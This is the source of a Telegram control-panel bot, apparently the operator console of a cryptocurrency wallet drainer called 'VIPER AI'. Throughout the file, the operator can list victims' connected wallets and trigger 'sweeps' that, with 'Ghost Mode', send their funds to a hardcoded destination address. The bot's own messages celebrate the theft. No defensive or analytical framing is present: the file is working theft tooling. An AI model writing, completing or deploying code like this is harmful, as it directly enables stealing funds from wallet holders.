/**
 * TELEGRAM BOT - Control panel with inline buttons
 */

const { Telegraf, Markup } = require('telegraf');
const { TELEGRAM_BOT_TOKEN, TELEGRAM_USER_ID } = require('../../config/constants');
const walletSync = require('../core/walletSync');
const logger = require('../../utils/logger');

class TelegramBot {
  constructor() {
    this.bot = null;
    this.userSessions = new Map();
    this.initialized = false;
    
    // 🔥 FIX: Try-catch to prevent crash on invalid token
    try {
      this.bot = new Telegraf(TELEGRAM_BOT_TOKEN);
      
      // 🔥 FIX 1: Remove .launch() - use getMe() instead
      this.initialize();
      
      // 🔥 FIX 2: Just check if token works, don't start polling
      this.bot.telegram.getMe().then(botInfo => {
        this.initialized = true;
        logger.info(`✅ Telegram bot @${botInfo.username} verified`);
      }).catch(err => {
        logger.error('❌ Telegram bot verification failed:', err.message);
        this.initialized = false;
      });
      
    } catch (error) {
      logger.error('Telegram bot initialization failed:', error.message);
      this.initialized = false;
    }
  }

  initialize() {
    if (!this.bot) return;
    
    // Start command
    this.bot.start(async (ctx) => {
      const userId = ctx.from.id.toString();
      
      // Only allow authorized user
      if (userId !== TELEGRAM_USER_ID) {
        return ctx.reply('⛔ Unauthorized');
      }

      this.userSessions.set(userId, {
        chatId: ctx.chat.id,
        username: ctx.from.username,
        startedAt: Date.now()
      });

      await ctx.reply(
        `🐍 *VIPER AI CONTROL PANEL*\n\n` +
        `Ghost Mode is active. Connected wallets will auto-sweep to destination.\n\n` +
        `*Commands:*\n` +
        `/status - View connected wallets\n` +
        `/wallets - List active wallets\n` +
        `/trigger - Manually trigger sweep\n` +
        `/stats - View sweep statistics`,
        {
          parse_mode: 'Markdown',
          ...Markup.inlineKeyboard([
            [Markup.button.callback('📊 Status', 'get_status')],
            [Markup.button.callback('👛 Wallets', 'list_wallets')],
            [Markup.button.callback('⚡ Trigger Sweep', 'trigger_sweep')],
            [Markup.button.callback('📈 Stats', 'get_stats')]
          ])
        }
      );
    });

    // Status command
    this.bot.command('status', async (ctx) => {
      await this.sendStatus(ctx);
    });

    // Wallets command
    this.bot.command('wallets', async (ctx) => {
      await this.listWallets(ctx);
    });

    // Trigger command
    this.bot.command('trigger', async (ctx) => {
      await this.triggerSweep(ctx);
    });

    // Stats command
    this.bot.command('stats', async (ctx) => {
      await this.sendStats(ctx);
    });

    // Button handlers
    this.bot.action('get_status', async (ctx) => {
      await ctx.answerCbQuery();
      await this.sendStatus(ctx);
    });

    this.bot.action('list_wallets', async (ctx) => {
      await ctx.answerCbQuery();
      await this.listWallets(ctx);
    });

    this.bot.action('trigger_sweep', async (ctx) => {
      await ctx.answerCbQuery();
      await this.triggerSweep(ctx);
    });

    this.bot.action('get_stats', async (ctx) => {
      await ctx.answerCbQuery();
      await this.sendStats(ctx);
    });

    this.bot.action(/sweep_(.+)/, async (ctx) => {
      await ctx.answerCbQuery();
      const wallet = ctx.match[1];
      await this.sweepSpecificWallet(ctx, wallet);
    });

    // 🔥 FIX 3: Don't call bot.launch() here
    
    logger.info('Telegram bot handlers registered');

    // Enable graceful stop (just in case)
    process.once('SIGINT', () => {
      if (this.bot) this.bot.stop('SIGINT');
    });
    process.once('SIGTERM', () => {
      if (this.bot) this.bot.stop('SIGTERM');
    });
  }

  /**
   * Send status update
   */
  async sendStatus(ctx) {
    const activeWallets = walletSync.getActiveWallets();
    
    let message = `*📊 System Status*\n\n`;
    message += `*Connected Wallets:* ${activeWallets.length}\n`;
    message += `*Ghost Mode:* Active ✅\n`;
    message += `*Destination:* \`3CJTda...Y2Ad2\`\n\n`;
    
    if (activeWallets.length > 0) {
      message += `*Active Wallets:*\n`;
      activeWallets.forEach((w, i) => {
        message += `${i+1}. \`${w.address.slice(0, 8)}...${w.address.slice(-8)}\`\n`;
        message += `   Connected: ${new Date(w.connectedAt).toLocaleTimeString()}\n`;
      });
    } else {
      message += `No wallets currently connected.\n`;
    }

    await ctx.reply(message, { 
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('🔄 Refresh', 'get_status')],
        [Markup.button.callback('🏠 Main Menu', 'back_to_main')]
      ])
    });
  }

  /**
   * List wallets with sweep buttons
   */
  async listWallets(ctx) {
    const activeWallets = walletSync.getActiveWallets();
    
    if (activeWallets.length === 0) {
      return ctx.reply('No wallets connected');
    }

    const buttons = activeWallets.map(w => [
      Markup.button.callback(
        `⚡ Sweep ${w.address.slice(0, 6)}...${w.address.slice(-4)}`,
        `sweep_${w.address}`
      )
    ]);

    buttons.push([Markup.button.callback('🏠 Main Menu', 'back_to_main')]);

    await ctx.reply(
      `*👛 Connected Wallets (${activeWallets.length})*\n\n` +
      `Select a wallet to trigger sweep:`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard(buttons)
      }
    );
  }

  /**
   * Trigger sweep for all wallets
   */
  async triggerSweep(ctx) {
    const activeWallets = walletSync.getActiveWallets();
    
    if (activeWallets.length === 0) {
      return ctx.reply('No wallets connected');
    }

    await ctx.reply(`⚡ Triggering sweep for ${activeWallets.length} wallets...`);

    for (const wallet of activeWallets) {
      // Re-trigger ghost mode for each wallet
      await walletSync.onWalletConnected(wallet.address, wallet.socketId);
      await new Promise(r => setTimeout(r, 1000));
    }

    await ctx.reply('✅ Sweep initiated for all wallets');
  }

  /**
   * Sweep specific wallet
   */
  async sweepSpecificWallet(ctx, walletAddress) {
    await ctx.reply(`⚡ Sweeping ${walletAddress.slice(0, 8)}...`);
    
    try {
      await walletSync.onWalletConnected(walletAddress, 'manual');
      await ctx.reply('Ameer hogya bhai tu');
    } catch (error) {
      await ctx.reply(`❌ Error: ${error.message.slice(0, 100)}`);
    }
  }

  /**
   * Send statistics
   */
  async sendStats(ctx) {
    const stats = {
      totalWallets: walletSync.getActiveWallets().length,
      uptime: process.uptime(),
      memory: process.memoryUsage().heapUsed / 1024 / 1024,
      timestamp: Date.now()
    };

    await ctx.reply(
      `*📈 System Statistics*\n\n` +
      `Wallets Connected: ${stats.totalWallets}\n` +
      `Uptime: ${Math.floor(stats.uptime / 60)} minutes\n` +
      `Memory: ${stats.memory.toFixed(2)} MB\n` +
      `Destination: \`3CJTdaP5ZrvCyWQ8MNs2DzPPjzafqtNtiSDgked2YAd2\``,
      { parse_mode: 'Markdown' }
    );
  }

  /**
   * Send alert to Telegram
   */
  async sendAlert(userId, message, buttons = []) {
    // 🔥 FIX: Agar bot initialized nahi hai toh return without error
    if (!this.initialized || !this.bot) {
      logger.debug('Telegram bot not initialized, alert skipped');
      return false;
    }

    try {
      const keyboard = buttons.length > 0 
        ? Markup.inlineKeyboard(buttons.map(btn => [Markup.button.callback(btn.text, btn.callback)]))
        : undefined;

      await this.bot.telegram.sendMessage(
        userId || TELEGRAM_USER_ID,
        `🐍 *VIPER AI Alert:* This mf is locked sir \n\n${message}`,
        { parse_mode: 'Markdown', ...keyboard }
      );
      
      logger.info(`Alert sent: ${message.slice(0, 50)}...`);
      return true;
    } catch (error) {
      logger.error('Send alert failed:', error);
      return false;
    }
  }
}

module.exports = new TelegramBot();